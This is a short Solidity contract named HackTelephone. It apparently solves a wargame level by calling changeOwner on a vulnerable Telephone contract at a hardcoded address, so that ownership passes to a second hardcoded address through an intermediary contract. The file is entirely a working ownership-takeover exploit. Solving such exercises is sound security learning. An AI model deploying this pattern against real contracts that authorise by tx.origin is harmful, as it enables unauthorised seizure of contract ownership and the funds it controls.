// SPDX-License-Identifier: MIT
pragma solidity >= 0.8.0 < 0.9.0;
import "./Telephone.sol";

contract HackTelephone {

    Telephone public vulnerableContract = Telephone(0x472053fcd56764071EdfCdf3B2d17BC989371D5a);

    function assumeOwnership() external {
        vulnerableContract.changeOwner(0x76178270f00998Aa3a46D4489c121E9b1d8646bC);
    }
}
